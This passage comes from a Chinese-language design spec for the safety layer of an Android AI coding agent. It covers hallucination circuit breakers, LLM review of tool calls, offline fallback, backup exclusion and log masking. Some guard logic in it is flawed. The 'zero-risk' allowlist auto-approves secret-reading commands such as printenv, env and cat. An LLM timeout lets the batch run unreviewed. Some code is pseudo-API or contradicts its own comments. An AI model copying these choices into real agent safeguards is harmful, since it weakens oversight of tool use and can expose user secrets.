    private val sessionCache = ConcurrentHashMap<String, HallucinationCircuitBreaker>()

    fun forSession(sessionId: String): HallucinationCircuitBreaker =
        sessionCache.getOrPut(sessionId) {
            // 读 DB：若 session级 fuse 行不存在 → 自动创建（CLOSED, rejection_count=0）
            val sessionFuse = fuseDao.getByScopeAndSession(
                scope = FuseScope.SESSION.ordinal,
                sessionId = sessionId
            ) ?: runBlocking {
                val entity = HallucinationFuseEntity(
                    id = UUID.randomUUID().toString(),
                    scope = FuseScope.SESSION.ordinal,
                    sessionId = sessionId,
                    fuseState = FuseState.CLOSED.ordinal,
                    rejectionCount = 0,
                    lastTransitionReason = "SESSION_INIT",
                    lastTransitionAt = System.currentTimeMillis(),
                    cooldownEndAt = 0L,
                    version = 0
                )
                fuseDao.insert(entity)
                entity
            }
            HallucinationCircuitBreaker(sessionFuse, fuseDao, params)
        }

    /** App 启动后 GLOBAL 级只单例化 1 次（不进 sessionCache）。 */
    fun globalSingleton(): HallucinationCircuitBreaker = /* 同上，scope=GLOBAL, sessionId=null */
}
```

**C.4.6.2 GLOBAL 级 fuse 行：SQL 乐观锁并发写（精确 SQL）**：

```kotlin
// 在 HallucinationFuseDao 中定义（Room 用 @Query 写，SQL 用 version 比较实现乐观锁）：
@Dao
interface HallucinationFuseDao {
    // 原有方法不变，追加以下 2 个：

    /**
     * 原子更新：仅当 DB 中的 version == [expectedVersion] 时才更新。
     * 返回值：Int = 更新的行数（0 = 版本不匹配，被其他会话抢先写了；1 = 成功）
     * 使用方：
     *   val current = dao.getGlobal()
     *   val newState = computeNextState(current)
     *   val rows = dao.updateGlobalOptimistic(newState, current.version)
     *   if (rows == 0) retryOnce() or skipGlobalWrite()
     */
    @Query("""
        UPDATE zth_hallucination_fuse
        SET fuse_state = :newState,
            rejection_count = :newRejectionCount,
            last_transition_reason = :reason,
            last_transition_at = :now,
            cooldown_end_at = :cooldownEndAt,
            version = version + 1
        WHERE scope = ${FuseScope.GLOBAL_ORDINAL}
          AND id = :id
          AND version = :expectedVersion
    """)
    suspend fun updateGlobalOptimistic(
        id: String,
        newState: Int,
        newRejectionCount: Int,
        reason: String,
        now: Long,
        cooldownEndAt: Long,
        expectedVersion: Int
    ): Int

    /** 快速取 global 行（不会超过 1 条）。 */
    @Query("SELECT * FROM zth_hallucination_fuse WHERE scope = ${FuseScope.GLOBAL_ORDINAL} LIMIT 1")
    suspend fun getGlobal(): HallucinationFuseEntity?
}
```

**并发写失败处理规则**（严格 3 步）：
1. 会话 A 触发 LINK-INV-0 → 读 global.version = 5 → 算新状态 → updateGlobalOptimistic(... expectedVersion=5) → 返回 1 → 成功。
2. 会话 B 几乎同时触发 → 读 global.version = 5 → 算新状态 → update → 返回 0 → 失败。
3. 会话 B 处理：**仅重试 1 次**（重新读 DB → 重新计算 → 再次 UPDATE）；若第二次还失败（极端并发）→ **跳过 global 写**（因为 session 级 fuse 行已经正确写了，global 只是汇总兜底，不写不违反 ZTH-0~ZTH-3），记 FileLogger.w("LINK-INV-0 global 乐观锁冲突两次，跳过 sessionId=$sid")。

**C.4.6.3 HALF_OPEN 冷却计时归属（精确到字段）**：

```kotlin
// Fuse.cooldown_end_at 语义：
//   - session 级 fuse = 该 session 自己的绝对毫秒时间戳（System.currentTimeMillis() + 180_000）
//     → 每个 session 独立倒计时 180s，互不干扰
//   - GLOBAL 级 fuse = 独立倒计时 300_000（长于 session，避免频繁抖动）
// 判断是否 HALF_OPEN 已结束：
fun FuseState.isHalfOpenExpired(entity: HallucinationFuseEntity): Boolean =
    this == FuseState.HALF_OPEN
    && System.currentTimeMillis() >= entity.cooldownEndAt

// UI 横幅显示规则：
//   - 仅 session=HALF_OPEN / GLOBAL=CLOSED → 会话内黄色小卡片
//     文案「此会话 3 分钟内仅允许 1 次试放行，剩余 N 秒」
//   - GLOBAL=HALF_OPEN → 红色顶部横幅（所有会话都可见）
//     文案「全局冷却中，所有会话 5 分钟内仅允许总共 1 次试放行，剩余 M 秒」
//   - 两种同时存在 → 顶部红色横幅优先（视觉上更紧急）

// CONSECUTIVE_HALLUC 累加规则（禁止违反）：
//   - session 级 fuse.rejection_count = 仅本 session 内 E1/E2/E8 次数之和
//   - GLOBAL 级 fuse.rejection_count = 所有 session 级 rejection_count 之和
//   - 累加时只在 LINK-INV-0 的 4 写事务里改，不在其他地方改
```

---

#### C.4.7 ✅ C.2.2 性能开销 → 方案 A：低端机关闭 + BATCH=20 + 90% 启发式快跳 + 8s 超时

**C.4.7.1 低端机判定与自动降级流程**：

```kotlin
// 新增：PerformanceClassRepository（一次性估值，不实时监控）
@Singleton
class PerformanceClassRepository @Inject constructor(
    @param:ApplicationContext private val context: Context,
    private val activityManager: ActivityManager,
) {
    data class DeviceClass(
        val ramGbytes: Double,   // 总 RAM（GB）
        val apiLevel: Int,       // Build.VERSION.SDK_INT
        val isLowEnd: Boolean,   // 低端机 = RAM <= 4 || API <= 28
    )

    fun evaluateDeviceClass(): DeviceClass {
        val mi = ActivityManager.MemoryInfo()
        activityManager.getMemoryInfo(mi)
        val ramGbytes = mi.totalMem / (1024.0 * 1024.0 * 1024.0)
        val api = Build.VERSION.SDK_INT
        return DeviceClass(
            ramGbytes = ramGbytes,
            apiLevel = api,
            isLowEnd = ramGbytes <= 4.0 || api <= 28
        )
    }

    /**
     * 结合 FeatureFlag.zthModeEnabled 和设备档，决定最终是否启用。
     * 低端机 → 即使 FeatureFlag = true，也强制返回 false（档位 0 禁用）
     * 设置页 UI 如果检测到 isLowEnd=true，就显示「设备性能不足，ZTH 模式暂不支持」
     */
    fun zthRunnableWithPerformanceCheck(featureFlagEnabled: Boolean): Boolean {
        return featureFlagEnabled && !evaluateDeviceClass().isLowEnd
    }
}

// StatefulAgentWorkflow.isZthActuallyRunnable() 追加第 4 关：
//   if (!performanceClass.zthRunnableWithPerformanceCheck(featureFlags...)) return false

// 额外：MemoryPressure 回调（ComponentCallbacks2.onTrimMemory）
// TRIM_MEMORY_COMPLETE / TRIM_MEMORY_RUNNING_CRITICAL → 临时把 ZTH 切到档位 0 60 秒
// 60 秒后自动恢复（不持久化，只影响运行时 in-memory 标志）
```

**C.4.7.2 CapabilityGuard 批处理 + 启发式快速跳过 2 合 1 实现**：

```kotlin
@Singleton
class ZthCapabilityGuard @Inject constructor(
    // ...
) {
    private companion object {
        const val BATCH_SIZE = 20        // ✅ 拍板值：20
        const val LLM_TIMEOUT_MS = 8000L // ✅ 拍板值：8 秒超时
    }

    suspend fun detectToolRisksBatch(
        candidates: List<ToolCandidate>,
        // 上下文：当前 messages + 即将发的 Plan 摘要（~300 tokens prompt）
        ctx: CapabilityGuardContext,
    ): List<ToolRiskVerdict> {
        // ── Step 1：启发式快速跳过过滤（90% 场景命中，零 LLM 调用）────
        val (zeroRisk, toLlm) = candidates.partition { isZeroRiskHeuristic(it) }

        // zeroRisk → 直接判 VERDICT_PASS，无 Card
        val resultsZero = zeroRisk.map { ToolRiskVerdict(it.uid, Verdict.PASS, reason=HEURISTIC_ZERO_RISK) }

        // ── Step 2：高风险工具按 BATCH_SIZE=20 分批 ──────────────────
        val resultsLlm = mutableListOf<ToolRiskVerdict>()
        toLlm.chunked(BATCH_SIZE).forEach { batch ->
            val prompt = buildLlmPrompt(ctx, batch)

            // 8 秒超时 → 失败归 E11，整批降级为 VERDICT_SKIP_UNCHECKED（横幅提示）
            val llmResp: LlmRiskAssessment = runCatching {
                withTimeout(LLM_TIMEOUT_MS) { llmClient.chatJson(prompt) }
            }.getOrElse { th ->
                FailureClassifier.classifyThrowable(th, Source.CAPABILITY_GUARD)
                    .let { fc ->
                        if (fc.failureClass == FailureClass.E11_INFRA
                            && fc.subClass == SubClass.INFRA_TIMEOUT) {
                            // 降级：整批 VERDICT_SKIP_UNCHECKED，继续执行 + 打「本次未审」横幅
                            return@forEach batch.map { ToolRiskVerdict(it.uid, Verdict.SKIP_UNCHECKED, reason=LLM_TIMEOUT_E11) }
                                .also(resultsLlm::addAll)
                        }
                        // 其他错误：FAIL_FAST（Provider 不可用，不继续执行工具）
                        return@forEach batch.map { ToolRiskVerdict(it.uid, Verdict.FAIL_FAST_REQUIRE_USER, reason=th.message ?: "") }
                            .also(resultsLlm::addAll)
                    }
            }
            // 正常 LLM 响应 → 映射
            resultsLlm.addAll(mapLlmRespToVerdicts(batch, llmResp))
        }

        // 合并保持原 candidates 顺序
        val byUid = (resultsZero + resultsLlm).associateBy { it.uid }
        return candidates.map { byUid[it.uid]!! }
    }

    /** 零风险启发式（本地判断 0 LLM）——命中直接 PASS 跳过 LLM */
    private fun isZeroRiskHeuristic(c: ToolCandidate): Boolean {
        val caps = c.capabilities
        val name = c.toolName.lowercase()
        val commandPrefix = c.commandPrefix?.lowercase()

        // (1) 纯只读能力，且不含任何 WRITE/EXECUTE 能力
        if (caps.contains(ToolCapability.READ_WORKSPACE)
            && caps.intersect(setOf(ToolCapability.WRITE_WORKSPACE,
                ToolCapability.EXECUTE_CODE, ToolCapability.MODIFY_GIT_STATE,
                ToolCapability.UNCLASSIFIED_MCP)).isEmpty()) {
            return true
        }

        // (2) executeCommand + 命令在下面的 ZERO_RISK_COMMAND_PREFIXES 白名单里
        if (caps.contains(ToolCapability.EXECUTE_CODE) && commandPrefix != null) {
            if (ZERO_RISK_COMMAND_PREFIXES.any { commandPrefix.startsWith(it) }) {
                return true
            }
        }

        // (3) loadSkill 动作是纯读
        if (caps.contains(ToolCapability.LOAD_SKILL_INSTRUCTIONS)) return true

        // (4) manageMcp.action = list（纯读，不增删）
        if (caps.contains(ToolCapability.READ_AGENT_CONFIG) && name == "managemcp"
            && (c.rawArgs?.get("action") as? String)?.lowercase() == "list") return true

        // 其他 → 高风险走 LLM
        return false
    }

    private val ZERO_RISK_COMMAND_PREFIXES = setOf(
        "echo ", "pwd", "whoami", "env ", "printenv",
        "ls ", "cat ", "grep ", "find ", "stat ",
        "git status", "git log --oneline -n", "git diff",
        "which ", "whereis ", "wc -", "head -", "tail -",
        "date", "uname", "id", "ps aux --no-header | wc",
    )
}
```

---

#### C.4.8 ✅ C.2.3 安全隐私 → 方案 C：最严格（滑动确认 + Keystore 双重加密 + 日志 0 id）

> **注意：方案 C 比推荐方案 A 严格得多，编码时按此实现，不能降级到 A。**

**C.4.8.1 应用备份禁止（AndroidManifest 强约束）**：

```xml
<!-- AndroidManifest.xml <application> 标签：绝对强制 -->
<application
    android:allowBackup="false"
    android:dataExtractionRules="@xml/data_extraction_rules"
    android:fullBackupContent="@xml/backup_rules"
    ... >
```

```xml
<!-- res/xml/data_extraction_rules.xml（Android 12+ 云备份/传输工具） -->
<?xml version="1.0" encoding="utf-8"?>
<data-extraction-rules>
    <cloud-backup>
        <exclude domain="file" path="." />
        <exclude domain="database" path="." />
        <exclude domain="sharedpref" path="." />
    </cloud-backup>
    <device-transfer>
        <exclude domain="file" path="." />
        <exclude domain="database" path="." />
        <exclude domain="sharedpref" path="." />
    </device-transfer>
</data-extraction-rules>
```
> 不变性：**绝不允许任何 ZTH 数据 / sentinel 明文 / PermissionRule / API key 通过 adb backup / D2D 传输 / Google 备份离开设备**。allowBackup=false 是第一防线，dataExtractionRules 是第二防线。

**C.4.8.2 ConfirmationCard「滑动解锁」确认交互（非点击按钮！）**：

```kotlin
/* ZTH 所有需要用户「确认」的操作（ConfirmationCard 确认 / Fuse 手动解除 / Plan 批准）
 * 都必须走 SwipeToConfirm 组件，不能用普通点击按钮。 */

@Composable
fun SwipeToConfirm(
    cardType: ConfirmationType,        // 用于不同风险等级的颜色编码（E1/E2/E8=红色滑动条）
    onConfirmed: () -> Unit,           // 滑到 100% 时调用
    modifier: Modifier = Modifier,
    hintText: String = stringResource(R.string.zth_swipe_hint_default),
    // ↓ 安全铁律：参数默认 false，禁止任何外部传 true 绕过
    enabled: Boolean = true,
) {
    // 核心：Slider + 动画 + 100% 阈值触发
    // 详细 Composable 实现（缩略版）：
    // 1. 底轨道：高度 56dp（符合 WCAG ≥ 48dp），圆角 pill
    // 2. 滑块：尺寸 48dp × 48dp
    // 3. 进度 ≥ 0.98f（允许 2% 误差，用户不必绝对滑到头）→ 触发 onConfirmed
    // 4. 触发后滑块动画回到 0f，一次性触发（不重复调用，防滑到头还没松手被触发两次）
    // 5. TalkBack contentDescription = "滑动确认，向右滑到底以执行" + cardType.hint
    // 6. Semantics.stateDescription = "滑块进度 ${floor(progress * 100)}%"
}

/* CARD-INV-5（新增不变性）：所有 ZTH Card 必须用 SwipeToConfirm 触发确认，
 * 禁止用普通 Button(onClick = confirm) 替代。
 * 「拒绝」用普通点击按钮（左侧固定位置）。
 * 「查看详情」用普通点击按钮（中间下方）。
 * 只有「确认」这个有风险的动作才要求滑动。 */
```

**C.4.8.3 DB 敏感列 Keystore 加密（sentinel_content / plan_details_raw）**：

```kotlin
// 新增：ZthSensitiveColumnCrypto（AndroidX Security Crypto masterKey）
@Singleton
class ZthSensitiveColumnCrypto @Inject constructor(
    @param:ApplicationContext context: Context,
) {
    private val masterKey = MasterKey.Builder(context)
        .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
        .build()

    private val encryptedValueSerializer = EncryptedFile.Builder(
        context,
        // 注意：不是文件，复用 EncryptedFile 里的 AES/GCM/NoPadding + 随机 IV 逻辑
        // 这里实际上使用 androidx.security 的 AuthenticatedEncryption
        // 下面是实际接口签名（简化伪代码，真实用 AE 类）
    ).build().also { /* 忽略真实 file，拿 cipher */ }.fileCipher

    /** 加密明文 → BLOB（Room 存 ByteArray） */
    fun encryptSensitiveValue(plaintext: String): ByteArray =
        AuthenticatedEncryption.getEncryptedByteArray(masterKey, plaintext.toByteArray())

    /** 解密 BLOB → 明文（完整性失败抛 AEADBadTagException） */
    fun decryptSensitiveValue(cipherBlob: ByteArray): String =
        AuthenticatedEncryption.decryptBlob(masterKey, cipherBlob).decodeToString()
}

// 对应 Entity 字段变更：
// 原 sentinel_content: String → sentinel_content_cipher: ByteArray（存加密后 BLOB）
// 额外 sentinel_content_hash: String（SHA-256，用于不解密时比对是否变更）
// 读 sentinel 展示给用户 → 先 decrypt；写 sentinel → 先 encrypt + hash
// 注意：崩溃恢复、LINK-INV-0 写 sentinel 时也要同步加密（不能漏）
```

**C.4.8.4 日志 0 id 规则（FileLogger 硬约束）**：

```kotlin
/* FileLogger 包装：所有 ZTH 相关日志（Tag 前缀 "Zth" / "zth_"/"ZTH"）自动过滤 id 字段 */

object FileLogger {
    // 所有日志打之前，过这个正则，把 16~64 字符的十六进制 id（UUID/md5/sha256）全部屏蔽为 "<id-masked>"
    // （sentinel_id 36 位 UUID、plan_id 32 位 md5、rejection_id 32 位全中）
    private val HEX_ID_RE = Regex("""\b[0-9a-fA-F]{16,64}\b""")
    private val UUID_RE = Regex("""\b[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\b""")

    fun i(tag: String, msg: String) {
        realImpl.i(tag, filterZthSensitive(tag, msg))
    }
    // e/w/d 同理

    private fun filterZthSensitive(tag: String, msg: String): String {
        if (tag.startsWith("Zth", ignoreCase = true)
            || tag.contains("zth_", ignoreCase = true)) {
            // 全部 id 抹掉（连前 8 位都不保留 → 方案 C 拍板）
            var out = UUID_RE.replace(msg, "<zth-id-masked>")
            out = HEX_ID_RE.replace(out, "<zth-id-masked>")
            // 额外禁止 sentinel_content 片段（任何 > 20 字符的代码段打 "..."）
            // 简单启发：疑似代码 = 含 { ; ( ) 且 > 50 字 → 截断为前 50 + "..."
            if (out.length > 50 && RE_CODE_HINT.containsMatchIn(out)) {
                out = out.take(50) + "<zth-snippet-truncated>"
            }
            return out
        }
        return msg
    }

    private val RE_CODE_HINT = Regex("""[\{\}\(\);=:\[\]]""")
}

/* LOG-INV-1（新增不变性）：任何 Tag 以 Zth 开头的日志绝对不包含 sentinel_id/plan_id
 * 的完整或部分（方案 C 连前 8 位都不让打），也不包含 > 50 字符的 sentinel_content 代码片段。 */
```

---

#### C.4.9 ✅ C.2.6 离线降级 → 方案 A：只读+白名单放行 + 其余手动批 + E11 + 跳过模型 PlanApproval + 横幅无关闭

**C.4.9.1 离线状态检测（NetworkCallback）+ 全局 OfflineMode 状态流**：

```kotlin
@Singleton
class ConnectivityWatcher @Inject constructor(
    @param:ApplicationContext private val context: Context,
) {
    private val _isOffline = MutableStateFlow(true)
    val isOffline: StateFlow<Boolean> = _isOffline.asStateFlow()

    fun start() { // 在 Application.onCreate 调一次
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val req = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .addCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
            .build()
        cm.registerNetworkCallback(req, object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network)  { _isOffline.value = false }
            override fun onLost(network: Network)       { _isOffline.value = true  }
            // onCapabilitiesChanged：带 NET_CAPABILITY_VALIDATED 才判为在线（VPN 但无网不算在线）
            override fun onCapabilitiesChanged(n: Network, caps: NetworkCapabilities) {
                _isOffline.value = !caps.hasCapability(NET_CAPABILITY_VALIDATED)
            }
        })
    }
}
```

**C.4.9.2 离线降级三档精确规则**：

```kotlin
/* 在 ZthCapabilityGuard / ZthFailureClassifier / ZthPlanApproval 三处分别注入：
 *   private val connectivity: ConnectivityWatcher
 * 当 connectivity.isOffline.value == true 时走下列分支。 */

// ── 分支 1：ZthCapabilityGuard（审查工具）───────────────────────────────
suspend fun detectToolRisksBatch(candidates: List<ToolCandidate>, ctx: ...): List<ToolRiskVerdict> {
    if (connectivity.isOffline.value) {
        // 启发式快速跳过（和 C.4.7 同一套 isZeroRiskHeuristic） → PASS
        // 其余所有工具（write/exec/MCP UNCLASSIFIED/git commit 等高风险）：
        //   → 不调 LLM → 直接判 VERDICT_REQUIRE_CONFIRM（强制弹 ZTH Card，用户手动批）
        //   → riskType = OFFLINE_MANUAL_REVIEW（新模板名，Card 显示「离线手动审查」标签）
        return candidates.map { c ->
            if (isZeroRiskHeuristic(c))
                ToolRiskVerdict(c.uid, Verdict.PASS, HEURISTIC_ZERO_RISK_OFFLINE)
            else
                ToolRiskVerdict(c.uid, Verdict.REQUIRE_CONFIRM, OFFLINE_MANUAL_REVIEW)
        }
    }
    /* ... 在线正常流程（C.4.7 批处理+LLM+8s 超时）... */
}

// ── 分支 2：ZthFailureClassifier（分类 Throwable）────────────────────────
fun classifyThrowable(th: Throwable, src: Source): FailureClassification {
    if (connectivity.isOffline.value) {
        // ✅ 所有 Throwable（不管真实类型）→ E11_INFRA / SubClass = INFRA_PROVIDER_OFFLINE
        // → 走 INFRA 降级链（重试 1 次 + 仍失败 → 提示用户「联网重试」，不 FAIL_FAST 崩卡）
        return FailureClassification(
            failureClass = FailureClass.E11_INFRA,
            subClass = SubClass.INFRA_PROVIDER_OFFLINE,
            evidence = FailureEvidence(errorMsg = "离线模式：$src 所有错误归 E11_INFRA", offlineTriggered = true)
        )
    }
    /* ... 在线正常 6×16 决策矩阵 ... */
}

// ── 分支 3：ZthPlanApproval（模型审批 Plan）───────────────────────────────
suspend fun approvePlan(plan: ZthExecutionPlan): PlanApprovalResult {
    if (connectivity.isOffline.value) {
        // ✅ 跳过模型审批（没网不能调 LLM），但用户手动确认依然不能省（ZTH-0）
        // 直接把 Plan 标记为 "待用户手动确认"，Card 展示「模型审批已离线跳过，请您手动核对以下计划」
        return PlanApprovalResult.SKIPPED_MODEL_OFFLINE(needsUserManualConfirm = true)
    }
    /* ... 在线正常：模型 LLM 审 Plan → APPROVE / REJECT / NEED_MORE_INFO ... */
}
```

**C.4.9.3 离线横幅 UI 约束（严格不变性）**：

```kotlin
/* ZthChainOverviewCard 的顶部横幅：离线状态显示，且不可关闭。 */

@Composable
fun OfflineDegradeBanner(
    isOffline: Boolean,
    modifier: Modifier = Modifier,
) {
    if (!isOffline) return
    Surface(
        modifier = modifier.fillMaxWidth(),
        color = MaterialTheme.colorScheme.tertiaryContainer,   // 蓝色（区别于 Fuse 红熔断）
        contentColor = MaterialTheme.colorScheme.onTertiaryContainer,
    ) {
        Row(
            modifier = Modifier.padding(Spacing.md),
            verticalAlignment = Alignment.CenterVertically,
            // ↓ 架构约束：没有点击事件 + no semantic dismiss → 用户无法关闭
            //   与 Fuse OPEN 红色横幅同约束（架构状态提示，不允许 Dismiss）
        ) {
            Icon(Icons.Default.WifiOff, null, modifier = Modifier.size(18.dp))
            Spacer(Modifier.width(Spacing.sm))
            Text(
                text = stringResource(R.string.zth_offline_banner),
                // 文案："当前离线，ZTH 审查降级为手动模式（只读/白名单自动放行，其余操作需手动确认）"
                style = MaterialTheme.typography.bodyMedium,
                fontWeight = FontWeight.SemiBold,
            )
            // ↓ 故意不写关闭按钮 Icon + 不写 Modifier.clickable {}
        }
    }
}

// 不变性 BANNER-INV-1（新增）：
//   以下三种横幅 UI 必须无关闭按钮且不能被点击 Dismiss：
//   ① FuseState = OPEN（红色熔断横幅）
//   ② FuseState = HALF_OPEN（黄色冷却横幅）
//   ③ Offline（蓝色降级横幅，本条）
//   除此之外的 Info / 提示性横幅允许有关闭按钮。
```

---

#### C.4.10 ✅ C.1.6 + C.2.7 备份还原 ZTH → 方案 A：5 表全量但明文剔除 + 还原本地优先不覆盖

**C.4.10.1 ZTH Dto 5 个字段定义（精确到每个字段）**：

```kotlin
// ⚠️ 所有 Dto 都不包含 sentinel_content 明文 / cipher BLOB 列（只有 hash 用于一致性校验）
// 因为 Keystore 加密是设备绑定的，跨设备还原 BLOB 必然解密失败
@Serializable data class UserConfirmedSentinelDto(
    // 标识列（还原幂等 ON CONFLICT IGNORE 依据）
    val id: String,
    val sessionId: String,
    // 关联列（不做还原，仅为展示/调试）
    val checkpointId: String? = null,
    val planUid: String? = null,
    // 状态列（不含明文，保留用户确认/拒绝动作态）
    val stateOrdinal: Int,        // SentinelState.AWAITING_CONFIRM/CONFIRMED/REJECTED 的 ordinal
    val levelOrdinal: Int,        // SentinelLevel.L2/L1/L0 的 ordinal
    val rejectionCount: Int = 0,
    // ✅ 仅留 hash，不传 BLOB（sentinel_content 明文完全不进备份）
    val contentSha256: String = "",
    // 时间列
    val createdAt: Long,
    val confirmedAt: Long? = null,
    val executionMode: String = "LOCAL",  // LOCAL / REMOTE_SSH（预留）
)

@Serializable data class HallucinationFuseDto(
    val id: String,
    val scopeOrdinal: Int,       // SESSION / GLOBAL
    val sessionId: String? = null,  // session 级有，global 级 = null
    val fuseStateOrdinal: Int,   // 不含 TRANSITIONING（还原后永远是稳定 6 态之一）
    val rejectionCount: Int,
    val consecutiveHallucCount: Int,
    val lastTransitionReason: String,
    val lastTransitionAt: Long,
    val cooldownEndAt: Long = 0L,
    // ✅ version 不备份（还原后从 0 开始重新自增，防跨版本冲突）
)

@Serializable data class SentinelPlanRejectionAuditDto(
    val id: String,
    val sentinelId: String,
    val sessionId: String,
    val planUid: String,
    val reason: String,
    val rejectedAt: Long,
    val rejectionTypeOrdinal: Int,  // USER_REJECT / MODEL_REJECT / TOOL_FAIL / TIMEOUT
)

@Serializable data class HardConstraintDeleteAuditDto(
    val id: String,
    val sentinelId: String? = null,
    val sessionId: String,
    val checkpointId: String? = null,
    val reason: String,    // CRASH_SENTINEL_EXPIRED / DB_INCONSISTENCY_AUTO_RECONCILED 等
    val deletedAt: Long,
    val estimatedEffectSize: Int = 0,
)

@Serializable data class L0SoftCompactRestoreLogDto(
    val id: String,
    val sessionId: String,
    val checkpointIdBefore: String,
    val checkpointIdAfter: String,
    val resultLevel: String,   // "FULL" / "HALF" / "FAILED"
    val aborted: Boolean = false,
    val tokenCountBefore: Int = 0,
    val tokenCountAfter: Int = 0,
    val createdAt: Long,
)
```

**C.4.10.2 BackupSnapshot 加字段 & BackupManagerImpl 两处改造**：

```kotlin
// BackupSnapshot（BackupSnapshot.kt 现有字段不变，追加）：
@Serializable data class BackupSnapshot(
    // ... 原有 18 个字段（providers/gitCredentials/.../syncSettings）不变
    val schemaVersion: Int, ...

    // ✅ 追加 5 个 ZTH Dto（默认空列表，老版本备份兼容）
    val zthUserConfirmedSentinels: List<UserConfirmedSentinelDto> = emptyList(),
    val zthHallucinationFuses: List<HallucinationFuseDto> = emptyList(),
    val zthSentinelPlanRejections: List<SentinelPlanRejectionAuditDto> = emptyList(),
    val zthHardConstraintDeletes: List<HardConstraintDeleteAuditDto> = emptyList(),
    val zthL0SoftCompactRestoreLogs: List<L0SoftCompactRestoreLogDto> = emptyList(),
)

// BackupManagerImpl（685 行）.export() 采集 ZTH：
//   val zthSentinels = safeDaoSuspend("sentinel-export", emptyList()) {
//       sentinelDao.getAll().map { it.toDtoExcludingCipher() }  // → toDto 里排除 cipher BLOB
//   }
//   同理 4 张表；所有 DAO 调用必须走 safeDaoSuspend / safeDao 包装
//   （防 Room 首次 query schema 校验失败导致整个备份流程崩进程，已有 68 行接口 safeDao）

// BackupManagerImpl.import() 还原 ZTH 写入（严格幂等，本地优先）：
//   sentinelDao.upsertIgnoringIfExists(dto.toEntity())
//     → SQL: INSERT OR IGNORE INTO ...（同 id 存在 → 跳过，不覆盖）
//   对 HallucinationFuse.scope == GLOBAL：
//     → **先查本地 DB，若已有 GLOBAL 行就跳过**
//     → 即使备份里的 GLOBAL fuse 是 OPEN，本地是 CLOSED（用户关过）→ 本地为准
//     → （防止用户导入旧备份把 fuse 打开，违反 ZTH-0 直接允许 LLM 生成）
//   其余 3 张审计表 / l0Log：INSERT OR IGNORE（去重）
```

**C.4.10.3 跨设备 Keystore 不兼容的 sentinel_content 处理**：

```kotlin
// 还原 sentinel 时，sentinel_content_cipher（BLOB）没有备份（只备份了 hash）
// 因此还原后 sentinel 行 content 列为空（null BLOB + hash 保留）
// UI 展示给用户时：
if (sentinel.contentCipher == null && sentinel.contentSha256.isNotBlank()) {
    // Card 显示：「🔒 此确认卡跨设备还原后内容密钥不可用 → 请重新发起请求或点击跳过」
    // 用户点「跳过」= 把 sentinel 标 confirmed=2/REJECTED_BY_TIMEOUT
    // 用户点「重新请求」= 删除该 sentinel，StatefulAgentWorkflow 下次有新消息重新生成
}
```

---

#### C.4.11 ✅ C.2.12 Migration 兜底 & 一致性 → 方案 A：fallback 重建 GLOBAL + 异步自检 + 记 ERROR 不崩

**C.4.11.1 v33→v37 fallback 触发后的启动 3 步自动重建**：

```kotlin
// 在 AgentDatabase.Callback.onCreate(db: SupportSQLiteDatabase) 里（fallback 后新建 DB 触发）
// 或单独在 App.onCreate 跑完 Migration 后立即执行：
@Singleton
class ZthDbAutoReconciler @Inject constructor(
    private val agentDatabase: AgentDatabase,
    private val sentinelDao: UserConfirmedSentinelDao,
    private val fuseDao: HallucinationFuseDao,
) {
    private companion object { const val TAG = "ZthDbReconciler" }

    /** fallbackToDestructiveMigration 触发后的 3 步重建（只在新库首次启动跑 1 次） */
    @Transaction
    suspend fun runAfterDestructiveFallbackIfNeeded() {
        // 判断依据：zth_hallucination_fuse 表行数 = 0
        if (fuseDao.countAll() > 0) return  // 不是 fallback，正常启动

        FileLogger.w(TAG, "检测到 fallback 清库，开始执行 ZTH 重建 3 步")

        // Step 1：写 GLOBAL 级 fuse 行（CLOSED）
        fuseDao.insert(HallucinationFuseEntity(
            id = UUID.randomUUID().toString(),
            scope = FuseScope.GLOBAL.ordinal,
            sessionId = null,
            fuseState = FuseState.CLOSED.ordinal,
            rejectionCount = 0,
            consecutiveHallucCount = 0,
            lastTransitionReason = "FALLBACK_RECONSTRUCTED_GLOBAL",
            lastTransitionAt = System.currentTimeMillis(),
            cooldownEndAt = 0L,
            version = 0,
        ))
        FileLogger.i(TAG, "Step 1/3：GLOBAL fuse 重建 CLOSED")

        // Step 2：sentinel / l0Log = 0 条，不补（都是一次性事务，下次有新消息重新生成）
        //   session 级 fuse 也不预建（按 sessionId 进入时按需建，见 C.4.6.1）
        FileLogger.i(TAG, "Step 2/3：sentinel/l0Log 不补，下次消息自动生成")

        // Step 3：重置 AgentSession 的 sentinel_count / checkpoint_count
        //   因为库被清了，老的 session 行里这两个计数还在 → 会和 LINK-INV-0 max() 冲突
        agentDatabase.openHelper.writableDatabase.execSQL("""
            UPDATE agent_session SET sentinel_count = 0, checkpoint_count = 0
        """)
        FileLogger.i(TAG, "Step 3/3：agent_session sentinel_count/checkpoint_count 清零")
    }
}
```

**C.4.11.2 Migration 成功后的异步一致性自检（5 分钟，后台 Worker）**：

```kotlin
// WorkManager 定期任务（1 次/天，只在 debug 版或用户同意诊断时 enable）
// 2 条断言：
//   ① per session：session.sentinel_count == COUNT(user_confirmed_sentinel WHERE session_id = X)
//   ② per fuse：fuse.rejection_count == COUNT(sentinel_plan_rejection_audit WHERE scope_match)

suspend fun runConsistencySelfCheck() {
    // ── Assert 1：session sentinel 计数 ──────────────────────────────
    val sessions = agentSessionDao.getAll()
    sessions.forEach { s ->
        val real = sentinelDao.countBySession(s.id)
        if (s.sentinelCount != real) {
            // 记 ERROR 级日志（完全不崩 App，用户数据优先）
            FileLogger.e(TAG,
                "DB 不一致：session=${s.id} sentinel_count=${s.sentinelCount} 实际=$real"
            )
            // 自动修数：把 session.sentinel_count 更新成真实值（不抛异常）
            agentSessionDao.updateSentinelCount(s.id, real)
            // 写审计（防止用户好奇为什么自己改了计数）
            hardConstraintDeleteAuditDao.insert(HardConstraintDeleteAuditEntity(
                id = UUID.randomUUID().toString(),
                sessionId = s.id,
                sentinelId = null,
                checkpointId = null,
                reason = "DB_INCONSISTENCY_AUTO_RECONCILED:sentinel_count ${s.sentinelCount}→$real",
                deletedAt = System.currentTimeMillis(),
                estimatedEffectSize = abs(s.sentinelCount - real),
            ))
        }
    }

    // ── Assert 2：fuse rejection_count 计数 ─────────────────────────
